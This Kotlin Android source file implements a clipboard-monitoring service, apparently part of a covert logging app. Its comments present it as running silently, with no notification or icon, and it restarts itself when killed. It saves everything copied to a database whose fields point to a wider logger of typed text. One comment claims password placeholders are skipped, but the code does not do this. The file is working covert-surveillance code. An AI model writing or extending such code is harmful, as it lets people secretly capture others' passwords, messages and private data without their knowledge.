package com.example.memo.service

import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.IBinder
import com.example.memo.data.AppDatabase
import com.example.memo.data.EntryEntity
import com.example.memo.data.SettingsManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Background service that silently watches the system clipboard.
 * Every time something new is copied, it saves it to the database.
 * Runs as a started service — no foreground notification, no sound, no icon.
 */
class ClipboardMonitorService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    private lateinit var database: AppDatabase
    private lateinit var settings: SettingsManager
    private lateinit var clipboardManager: ClipboardManager

    private var lastSavedText: String = ""

    private val clipListener = ClipboardManager.OnPrimaryClipChangedListener {
        if (!settings.isCapturingEnabled) return@OnPrimaryClipChangedListener
        try {
            val clip = clipboardManager.primaryClip ?: return@OnPrimaryClipChangedListener
            if (clip.itemCount == 0) return@OnPrimaryClipChangedListener
            val text = clip.getItemAt(0).coerceToText(applicationContext).toString().trim()

            // Only save if it's new, non-empty, and not a password placeholder
            if (text.isNotBlank() && text != lastSavedText && text.length < 5000) {
                lastSavedText = text
                scope.launch {
                    database.entryDao().insertEntry(
                        EntryEntity(
                            appName = "📋 Clipboard",
                            packageName = "clipboard",
                            typedText = text,
                            timestamp = System.currentTimeMillis(),
                            source = "CLIPBOARD"
                        )
                    )
                }
            }
        } catch (_: Exception) {
            // Ignore any clipboard access errors silently
        }
    }

    override fun onCreate() {
        super.onCreate()
        database = AppDatabase.getDatabase(applicationContext)
        settings = SettingsManager(applicationContext)
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboardManager.addPrimaryClipChangedListener(clipListener)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Restart automatically if killed by system
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        clipboardManager.removePrimaryClipChangedListener(clipListener)
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
